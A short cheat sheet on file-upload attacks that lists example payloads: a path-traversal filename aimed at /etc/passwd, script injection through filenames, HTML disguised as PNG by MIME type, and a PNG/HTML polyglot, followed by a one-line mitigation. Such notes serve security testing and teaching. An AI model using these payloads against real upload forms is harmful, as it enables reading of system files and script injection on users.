# FILE UPLOAD

## **TYPE 1**

If the server not change and filter the name of the archive

The attacker can inject XSS on the name and make a LFI

**Ex:**

- filename=`../../../../../etc/passwd`
- filename=`"><svg onload=alert(1)>`

## **TYPE 2**

If the website not filter the MIME Types the attacker can send a html file with a PNG extension and make a XSS

**Ex:**

- filetype=`text/html`
- filename=`image.png`
- content=`<script>alert(1)</script>`

## **TYPE 3**

The attacker can upload a PNG files with parts of HTML code and MIME text/html but bypass the file loader with the PNG parts

**Ex:**

- filetype=`text/html`
- filename=`image.png`
- content=`%$PNGugfadr%%w345esfuerg$%csuirgescu**<script>alert(1)</script>**adad54345$%¨#`

## **TYPE 4**

If the server upload images the attacker can change the EXIF data of the image

**Mitigation**

Change the name of the file after upload and check the MIME Types and Extension Type
